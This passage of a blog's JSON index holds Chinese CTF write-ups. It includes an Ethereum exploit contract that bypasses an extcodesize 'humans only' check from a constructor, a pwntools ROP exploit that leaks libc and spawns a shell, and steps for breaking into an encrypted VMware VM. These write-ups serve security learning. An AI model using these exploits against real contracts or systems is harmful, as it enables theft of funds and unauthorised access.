^0.4.24;/** * @title SafeMath * @dev Math operations with safety checks that revert on error */library SafeMath { /** * @dev Multiplies two numbers, reverts on overflow. */ function mul(uint256 a, uint256 b) internal pure returns (uint256) { // Gas optimization: this is cheaper than requiring 'a' not being zero, but the // benefit is lost if 'b' is also tested. // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522 if (a == 0) { return 0; } uint256 c = a * b; require(c / a == b); return c; } /** * @dev Integer division of two numbers truncating the quotient, reverts on division by zero. */ function div(uint256 a, uint256 b) internal pure returns (uint256) { require(b &gt; 0); // Solidity only automatically asserts when dividing by 0 uint256 c = a / b; // assert(a == b * c + a % b); // There is no case in which this doesn't hold return c; } /** * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend). */ function sub(uint256 a, uint256 b) internal pure returns (uint256) { require(b &lt;= a); uint256 c = a - b; return c; } /** * @dev Adds two numbers, reverts on overflow. */ function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; require(c &gt;= a); return c; } /** * @dev Divides two numbers and returns the remainder (unsigned integer modulo), * reverts when dividing by zero. */ function mod(uint256 a, uint256 b) internal pure returns (uint256) { require(b != 0); return a % b; }}contract WinnerList{ address owner; struct Richman{ address who; uint balance; } function note(address _addr, uint _value) public{ Richman rm; rm.who = _addr; rm.balance = _value; } }contract Fake3D { using SafeMath for *; mapping(address =&gt; uint256) public balance; uint public totalSupply = 10**18; WinnerList wlist; event FLAG(string b64email, string slogan); constructor(address _addr) public{ wlist = WinnerList(_addr); } modifier turingTest() { address _addr = msg.sender; uint256 _codeLength; assembly {_codeLength := extcodesize(_addr)} require(_codeLength == 0, \"sorry humans only\"); _; } function transfer(address _to, uint256 _amount) public{ require(balance[msg.sender] &gt;= _amount); balance[msg.sender] = balance[msg.sender].sub(_amount); balance[_to] = balance[_to].add(_amount); } function airDrop() public turingTest returns (bool) { uint256 seed = uint256(keccak256(abi.encodePacked( (block.timestamp).add (block.difficulty).add ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add (block.gaslimit).add ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add (block.number) ))); if((seed - ((seed / 1000) * 1000)) &lt; 288){ balance[tx.origin] = balance[tx.origin].add(10); totalSupply = totalSupply.sub(10); return true; } else return false; } function CaptureTheFlag(string b64email) public{ require (balance[msg.sender] &gt; 8888); wlist.note(msg.sender,balance[msg.sender]); emit FLAG(b64email, \"Congratulations to capture the flag?\"); }} &emsp;&emsp;可以看到我们的目的就是绕过turingTest，modifier声明的作用有点类似于Python中的修饰函数。它跟_结合起来可以实现： 1234567891011121314151617181920212223function temp() public { address _addr = msg.sender; uint256 _codeLength; assembly {_codeLength := extcodesize(_addr)} require(_codeLength == 0, \"sorry humans only\"); // _ 是替换位置的标志 uint256 seed = uint256(keccak256(abi.encodePacked( (block.timestamp).add (block.difficulty).add ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add (block.gaslimit).add ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add (block.number) ))); if((seed - ((seed / 1000) * 1000)) &lt; 288){ balance[tx.origin] = balance[tx.origin].add(10); totalSupply = totalSupply.sub(10); return true; } else return false;} &emsp;&emsp;那么关键就是绕过require(_codeLength == 0, &quot;sorry humans only&quot;);，根本就是bypass extcodesize。 Attack&emsp;&emsp;extcodesize的作用是return size of the code at address，经常拿来判别直接调用者是另一个合约还是用户，因为一个合约的code size不会是0，而用户是0. &emsp;&emsp;但问题就出来当合约正在执行构造函数constructor并部署时，其extcodesize为0，也就是说合约完全可以通过在constructor中调用方法而绕过该判断。所以我们只要通过不断部署合约来进行攻击就可以拿到flag。 &emsp;&emsp;有了上篇的基础后，这里的exp也比较好写和理解，如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475pragma solidity ^0.4.24;library SafeMath { /** * @dev Adds two numbers, reverts on overflow. */ function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; require(c &gt;= a); return c; }}contract Fake3D { mapping(address =&gt; uint256) public balance; function airDrop() public returns (bool); function CaptureTheFlag(string b64email);}contract PWNFake { using SafeMath for *; uint public test_count = 0; uint public goto_count = 0; constructor() public payable { Fake3D mime = Fake3D(0x4082cC8839242Ff5ee9c67f6D05C4e497f63361a); uint16 i; for (i = 0; i &lt; 900; i++) { test_count++; uint256 seed = uint256(keccak256(abi.encodePacked( (block.timestamp).add (block.difficulty).add ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add (block.gaslimit).add ((uint256(keccak256(abi.encodePacked(this)))) / (now)).add (block.number) ))); if((seed - ((seed / 1000) * 1000)) &lt; 288){ goto_count++; mime.airDrop(); } } } function get_goal() view public returns(uint256) { uint256 seed = uint256(keccak256(abi.encodePacked( (block.timestamp).add (block.difficulty).add ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add (block.gaslimit).add ((uint256(keccak256(abi.encodePacked(this)))) / (now)).add (block.number) ))); uint256 result = (seed - ((seed / 1000) * 1000)); return result; } function getbalance() view public returns(uint256) { Fake3D mime2 = Fake3D(0x4082cC8839242Ff5ee9c67f6D05C4e497f63361a); return mime2.balance(this); } function get_flag() public { Fake3D mime2 = Fake3D(0x4082cC8839242Ff5ee9c67f6D05C4e497f63361a); mime2.CaptureTheFlag(\"amF5ODBAcHJvdG9ubWFpbC5jb20=\"); } function error_test() public { Fake3D mime = Fake3D(0x4082cC8839242Ff5ee9c67f6D05C4e497f63361a); mime.airDrop(); }} &emsp;&emsp;这里的error_test是为了验证上面的漏洞，不是在构造函数constructor中调用是过不了extcodesize的判断的。 &emsp;&emsp;需要注意的地方就是原合约中使用msg.sender代入计算，而msg.sender是合约的直接调用者，这里就是我们自己的攻击合约的地址，所以我在exp中使用了this来代替，this在合约中表示合约本身的地址。 12345678uint256 seed = uint256(keccak256(abi.encodePacked( (block.timestamp).add (block.difficulty).add ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add (block.gaslimit).add ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add (block.number)))); &emsp;&emsp;另一个点就是这里是检测msg.sender的账户是否大于8888，而不是tx.origin。但赌中是给tx.origin发奖金的。所以我们还需要用tx.origin的用户去做调用CaptureTheFlag(string b64email)。这一步可以用web3js，也可以用metamask，用metamask的时候需要在data段里填CaptureTheFlag(string b64email)的abi。用web3js实现是： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161let Web3 = require(\"web3\");let Tx = require('ethereumjs-tx');const BigNumber = require('bignumber.js');let privKey = new Buffer.from('6c33....', 'hex');let fromAddress = \"0x527e6be04ec5a81fd3ef871694230edd432f010b\";// 合约地址let contractAddress = \"0x4082cC8839242Ff5ee9c67f6D05C4e497f63361a\";// 创建web3对象let web3 = new Web3();// 连接到 ropsten 测试节点let INFURA_API_KEY = \"9762c5d28b...\"let ROPSTEN_URL = \"https://ropsten.infura.io/\" + INFURA_API_KEYweb3.setProvider(new Web3.providers.HttpProvider(ROPSTEN_URL))let abi = [ { \"constant\": true, \"inputs\": [], \"name\": \"totalSupply\", \"outputs\": [ { \"name\": \"\", \"type\": \"uint256\" } ], \"payable\": false, \"stateMutability\": \"view\", \"type\": \"function\" }, { \"constant\": false, \"inputs\": [ { \"name\": \"b64email\", \"type\": \"string\" } ], \"name\": \"CaptureTheFlag\", \"outputs\": [], \"payable\": false, \"stateMutability\": \"nonpayable\", \"type\": \"function\" }, { \"constant\": false, \"inputs\": [ { \"name\": \"_to\", \"type\": \"address\" }, { \"name\": \"_amount\", \"type\": \"uint256\" } ], \"name\": \"transfer\", \"outputs\": [], \"payable\": false, \"stateMutability\": \"nonpayable\", \"type\": \"function\" }, { \"constant\": false, \"inputs\": [], \"name\": \"airDrop\", \"outputs\": [ { \"name\": \"\", \"type\": \"bool\" } ], \"payable\": false, \"stateMutability\": \"nonpayable\", \"type\": \"function\" }, { \"constant\": true, \"inputs\": [ { \"name\": \"\", \"type\": \"address\" } ], \"name\": \"balance\", \"outputs\": [ { \"name\": \"\", \"type\": \"uint256\" } ], \"payable\": false, \"stateMutability\": \"view\", \"type\": \"function\" }, { \"inputs\": [ { \"name\": \"_addr\", \"type\": \"address\" } ], \"payable\": false, \"stateMutability\": \"nonpayable\", \"type\": \"constructor\" }, { \"anonymous\": false, \"inputs\": [ { \"indexed\": false, \"name\": \"b64email\", \"type\": \"string\" }, { \"indexed\": false, \"name\": \"slogan\", \"type\": \"string\" } ], \"name\": \"FLAG\", \"type\": \"event\" }]function sendSigned(txData) { web3.eth.accounts.signTransaction(txData, '0x6c332f680...') .then(RLPencodedTx =&gt; { let transact = web3.eth.sendSignedTransaction(RLPencodedTx['rawTransaction']); transact.on('confirmation', (confirmationNumber, receipt) =&gt; { console.log('confirmation', confirmationNumber); }); transact.on('transactionHash', hash =&gt; { console.log('hash', hash); }); transact.on('receipt', receipt =&gt; { console.log('reciept', receipt); }); transact.on('error', console.error); });}let EOSGameContract = new web3.eth.Contract(abi, contractAddress);let ctf = EOSGameContract.methods.CaptureTheFlag('amF5ODBAcHJvdG9ubWFpbC5jb20=').encodeABI();let txData = { chainId: 3, gas: web3.utils.toHex(2500000), gasLimit: web3.utils.toHex(400*1e10), gasPrice: web3.utils.toHex(40*1e10), // 10 Gwei to: contractAddress, from: fromAddress, value: \"0x0\", //web3.utils.toHex(web3.utils.toWei(0, 'wei')), data: ctf}sendSigned(txData); &emsp;&emsp;查询当前用户的余额使用如下：12345678910111213141516pragma solidity ^0.4.24;contract Fake3D { mapping(address =&gt; uint256) public balance; function airDrop() public returns (bool); }contract GetBalance { Fake3D mime = Fake3D(0x4082cC8839242Ff5ee9c67f6D05C4e497f63361a); function getbalance() view public returns(uint256) { return mime.balance(tx.origin); }} &emsp;&emsp;当能在攻击合约里查到余额大于8888时就发起get_flag。 &emsp;&emsp; 在理一下流程就是：首先通过不断部署合约让自己的账户(tx.origin)的余额大于8888，然后用用户对Fake3D合约直接发起转账交易，把金额转到攻击成功的合约地址上，最后在攻击合约中发起get_flag。这里采用直接用用户发起CaptureTheFlag，脑子瓦特了。。。 &emsp;&emsp;这里我给攻击合约转了8900，理论上那么这个攻击合约也是可以发起get_flag的，但实际发现会报：1Warning! Error encountered during contract execution [Reverted] &emsp;&emsp;因为这个也要一定的耐心，成功率不会很高，这里就不做get flag操作了，攻击原理跟手段get到就好。。。 参考链接： https://segmentfault.com/a/1190000016087669 how_to_pwn_fomo3d_a_beginners_guide avoid-using-extcodesize-to-check-for-externally-owned-accounts ethereum-security","link":"/2018/11/bctf2018-fake3d-writeup/"},{"title":"PCB鹏程杯2018 writeup","text":"请阅读正文 overInt 附带大佬的writeup 先过两关检测，然后有： 123*(&amp;v8 + v6) = v5;v3 = (int *)(unsigned int)v5;printf(\"str_pos is %c\\n\", v3); 可以一位位的修改栈上任意地址 大佬说才100，只能写这么多了。完整exp如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980from pwn import *from struct import packcontext(os='linux',arch='amd64',aslr = 'False')local = 1log_level='debug'if local: p = process(\"./overInt\")#,env={'LD_PRELOAD':'./libc_x64.so.6'}) elf = ELF(\"./overInt\") #libc = ELF('./libc_x64.so.6')else: p = remote('58.20.46.148',35272) elf = ELF(\"./overInt\") #libc = ELF('./libc_x64.so.6')def change_addr(num,string): j = 0 for i in range(8): p.recvuntil(\"Which position you want to modify?\\n\") payload = p32(num) p.send(payload) p.recvuntil(\"What content you want to write in?\\n\") payload = string[j] p.send(payload) num += 1 j += 1 pop_rdi = 0x0000000000400b13read_got = elf.got[\"read\"] # 0x602038alarm_got = elf.got[\"alarm\"] # 0x602030start = 0x4005D0puts_plt = elf.plt[\"puts\"] # 0x40054cp.recvuntil(\"Please set arrary number:\")p.send(\"over\")p.recvuntil(\"How many numbers do you have?\\n\")p.send(p32(10))for i in range(9): data = p.recv() p.send(p32(0))p.recv() p.send(p32(0x20633372))p.recvuntil(\"How many positions you want to modify?\\n\")p.send(p32(32))string = \"\\x13\\x0b\\x40\\x00\\x00\\x00\\x00\\x00\" #pop_rdichange_addr(0x38,string)string = \"\\x38\\x20\\x60\\x00\\x00\\x00\\x00\\x00\" #read_gotchange_addr(0x40,string)string = \"\\x4c\\x05\\x40\\x00\\x00\\x00\\x00\\x00\" #puts_pltchange_addr(0x48,string)string = \"\\xd0\\x05\\x40\\x00\\x00\\x00\\x00\\x00\" #startchange_addr(0x50,string)p.recvuntil(\"!\")data = p.recvuntil(\"\\n\",drop=True).ljust(8,\"\\x00\")data = u64(data)libc_base = data - 0x0f7250binsh_addr = libc_base + 0x18cd57system_addr = libc_base + 0x045390p.recvuntil(\"Please set arrary number:\")p.send(\"over\")p.recvuntil(\"How many numbers do you have?\\n\")p.send(p32(10))for i in range(9): data = p.recv() p.send(p32(0))p.recv()p.send(p32(0x20633372))p.recvuntil(\"How many positions you want to modify?\\n\")p.send(p32(24))string = \"\\x13\\x0b\\x40\\x00\\x00\\x00\\x00\\x00\" #pop_rdichange_addr(0x38,string)string = pack('L',binsh_addr)change_addr(0x40,string)string = pack('L',system_addr)change_addr(0x48,string)p.interactive() hack1t打开虚拟机发现需要密码，把题目描述中的bibinb输入进行就行。 打开虚拟机后发现需要用户账号密码才进得去，随便试了一下都以失败告终，所以考点就是绕过用户验证，按常规套路来说在系统启动是强行进入GRUB，然后改密码，但发现进GRUB也需要密码： 所以这条路也行不通，那么另一个思路就是在加载系统时加载一个ISO，然后进入系统，再ISO镜像中对原来的硬盘进行操作。但发现修改虚拟机配置需要密码，而这个密码跟上面的不一样。 所以这条路暂时也没辙了。回过头查看下虚拟机的配置文件如vmx、nvram等，发现都已经被加密，正常的配置文件是键值对存储，而加密后的则如下： 12345.encoding = &quot;UTF-8&quot;displayName = &quot;Ubuntu 64-bit&quot;policy.vm.sourcevmid = &quot;52 b5 65 b9 89 e2 54 bf-e2 ee e6 99 1f 9d 2d 29&quot;encryption.keySafe = &quot;vmware:key/list/(pair/(phrase/a%2bFUjt......))&quot;encryption.data = &quot;A8Y2HMBeynR9AnL.....&quot; 因为虚拟机的配置是通过文件来实现的，所以如果我们能直接修改配置文件也能达到我们想要的结果，经过一番搜索后找到了一些有用的资料，在VMware的社区上发现了一个issue，有个大神实现了对vmx加密算法的破解和运用，并且发布到了GitHub中。 issue链接 GitHub项目 当然使用这个工具解密是会Will ask for the password，但我们还是可以再碰一下bibinb这个密码。 其实这个工具很早就下下来了，但当时不会用，其实是它的脚本写的有瑕疵，坑爹了，给我报了个error： 1Error: Cannot read from file Ubuntu 64-bit.vmx.bak 但拿去操作正常的vmx文件又是可以的，当时也没怎么多想，就把工具放在了一边，继续找资料，但后来就觉得这个错误或许可以跟一下，而正是这个决定让我拿下这题。打开main.py，很容易就发现了问题所在，程序进来后会判断： 123456789for line in lines: if displayname is None: match = re.match('displayName *= *\"(.+)\"\\n', line) if match: displayname = match.group(1) if 'encryption.keySafe' in line: keysafe = line elif 'encryption.data' in line: data = line 而在观察中发现它给的displayname是小写，而判断是大写，直接改一下试试： 改好后直接跑，发现成功解密出配置： 那么接下来就好办了，先在其他虚拟机上配置一个CDROM，看一下它的vmx配置文件怎么写，然后我们照抄过来，然后在加密回去就行，下面是配置cdrom： 1234sata0:1.deviceType = &quot;cdrom-image&quot;sata0:1.fileName = &quot;E:\\kali-linux-2018.1-i386.iso&quot;sata0:1.present = &quot;TRUE&quot;usb.present = &quot;TRUE&quot; # USB开启 然后在把解密出来的文件中的中文随便改成什么英文，防止python的编码错误。 1python3 main.py -e -D \"Ubuntu 64-bit\" -p bibinb reconver.vmx myencry.vmx 改好后替换掉原来的文件，然后在虚拟机配置中就能看到cdrom和USB已被开启。 紧接着在虚拟机启动时按ESC选择从CD-ROM中启动，这样就能进去系统，从而操作文件系统。 将四个部分的rar压缩包放在同一个文件夹，然后解压： 拿到flag。 Traffic_Light这是一个交通灯的gif，用file、binwalk检查后都很正常，猜测可能是灯的闪烁代表0,1。网上找了个分离每帧git的python脚本：12345678910111213141516171819# -*- coding:utf-8 -*-from PIL import Imageimport osgifFileName = 'Traffic_Light.gif'#使用Image模块的open()方法打开gif动态图像时，默认是第一帧im = Image.open(gifFileName)pngDir = gifFileName[:-4]#创建存放每帧图片的文件夹os.mkdir(pngDir)try: while True: #保存当前帧图片 current = im.tell() im.save(pngDir+'/'+str(current)+'.png') #获取下一帧图片 im.seek(current+1)except EOFError: pass 结果得到1168个项目。。。 没想到快捷方法，，只能手动过了一遍得到，先把绿灯当做1，红灯为0，黄灯为空格： 1234567891011121310011001 10010011 10011110 10011000 1000010010101111 10010011 11001100 11001011 1000110011001100 10100000 10001111 11001011 1000011010100000 11001011 10001011 10001011 1100110010010001 10001011 11001110 11001111 1001000110100000 10001011 11001111 10100000 1000101110001101 11001011 10011001 10011001 1100111010011100 10100000 10001100 11001011 1001100111001100 10001011 10000110 10100000 1000100010010111 11001100 10010001 10100000 1000011011001111 10001010 10100000 11001011 1000110111001100 10100000 11001111 10001010 1000101110001100 11001110 10011011 11001100 10000010 结果也发现每8个红绿灯就有一个黄灯，刚好分隔开，写个脚本跑一下： 12345678910f= open('./temp', 'r')flag = ''for oneline in f.readlines(): numbers = oneline.split(' ') for one in numbers: one = one.replace('1','2').replace('0','1').replace('2','0') flag += chr(int(one, 2))print(flag) 上面之所以做了替换时因为绿灯跟红灯代表的0/1给弄反了。。 What’s_thisBinwalk后发现有很多东西： Foremost后可以得到: 其中zip2.zip是加密的，而且里面有一个2-stage的文件，再看上面得到了，容易联想到明文攻击。 我们把上面的2-stage.what的what去掉，然后用Ubuntu自带的zip去压缩，7z和WinRAR压缩出来的都不行，ARCHPR识别不了。最后密码是Hello_Hi。 但flowerdance的内容令人失望，并没有有价值的东西。 File一下2-stage可以发现是jpg，直接改成jpg。 再根据提示用cloacked-pixel对这个图片进行处理，使用： 可以得到一个zip文件，内容如下： 但zip3、zip4都需要密码。前面得到的密码都对不上，而且发现这里zip3.zip中的guess文件只有4字节，可以考虑CRC32碰撞攻击。 这里使用hashcat神器，-D 2表示GPU破解。1.\\hashcat64.exe -a 3 -m 11500 -D 2 --force --increment --increment-min 4 --increment-max 6 --force 99bed60e:00000000 ?a ?a?a?a?a?a 结果只需2s，神器不亏是神器。。。 但密码不是zip3的，是zip4的。。然而还是没惊喜 回头再看那个docx文件，突然发现还有隐藏的东西： 直接将docx改成zip提取嵌入对象，在media里有新的东西： 其中image1.emf能打开，而i_love_you.emf却不行，但观察它的文件结尾，可以看到是zip的格式，binwalk也得出zip end。 在观察发现i_love_you.emf跟zip4.zip的文件大小相同，考虑异或一下两个文件，这里直接Google代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748# -*- coding: utf-8 -*-import binasciiimport struct# 每个字节转成hex，0x顺便去掉，对于不足两位的补0def str2hex(str): hexs = [] for s in str: tmp = (hex(ord(s)).replace('0x', '')) if len(tmp) == 2: hexs.append(tmp) else: hexs.append('0' + tmp) return hexsarr = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f']arr2 = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15]def tran(r): for i in range(len(arr)): if r == arr[i]: return arr2[i]f = open('D:\\\\CTF\\\\pcb\\\\whatis\\\\output\\\\zip\\\\docx\\\\word\\\\media\\\\I_Love_You.emf', 'rb')f2 = open('D:\\\\CTF\\\\pcb\\\\whatis\\\\output\\\\zip\\\\zip4.zip', 'rb')hexs = []hexs2 = []while True: t = f.readline() t2 = f2.readline() if not t or not t2: break hexs.extend(str2hex(t)) hexs2.extend(str2hex(t2))f.close()f2.close()ff = open('out.txt', 'wb')for i in range(min(len(hexs), len(hexs2))): a = tran(hexs[i][0]) * 16 + tran(hexs[i][1]) b = tran(hexs2[i][0]) * 16 + tran(hexs2[i][1]) B = struct.pack('B', a ^ b) ff.write(B)ff.close() 最终可以发现出来的是一个zip，相信这个才是完整的zip，用密码打开后：","link":"/2018/12/pcb-writeup/"}],"tags":[{"name":"笔记","slug":"笔记","link":"/tags/笔记/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"BlockChain","slug":"BlockChain","link":"/tags/BlockChain/"},{"name":"web3","slug":"web3","link":"/tags/web3/"},{"name":"pwn","slug":"pwn","link":"/tags/pwn/"},{"name":"windows","slug":"windows","link":"/tags/windows/"},{"name":"kali","slug":"kali","link":"/tags/kali/"},{"name":"xammpp","slug":"xammpp","link":"/tags/xammpp/"},{"name":"xdebug","slug":"xdebug","link":"/tags/xdebug/"},{"name":"office","slug":"office","link":"/tags/office/"},{"name":"CVE","slug":"CVE","link":"/tags/CVE/"},{"name":"mongodb","slug":"mongodb","link":"/tags/mongodb/"},{"name":"爬虫绕过","slug":"爬虫绕过","link":"/tags/爬虫绕过/"},{"name":"百度云","slug":"百度云","link":"/tags/百度云/"},{"name":"writeup","slug":"writeup","link":"/tags/writeup/"},{"name":"Hack","slug":"Hack","link":"/tags/Hack/"},{"name":"Oracle","slug":"Oracle","link":"/tags/Oracle/"},{"name":"bypass pie","slug":"bypass-pie","link":"/tags/bypass-pie/"},{"name":"blockchain","slug":"blockchain","link":"/tags/blockchain/"},{"name":"鹏程杯","slug":"鹏程杯","link":"/tags/鹏程杯/"}],"categories":[{"name":"jekyll update","slug":"jekyll-update","link":"/categories/jekyll-update/"},{"name":"CTF","slug":"CTF","link":"/categories/CTF/"}]}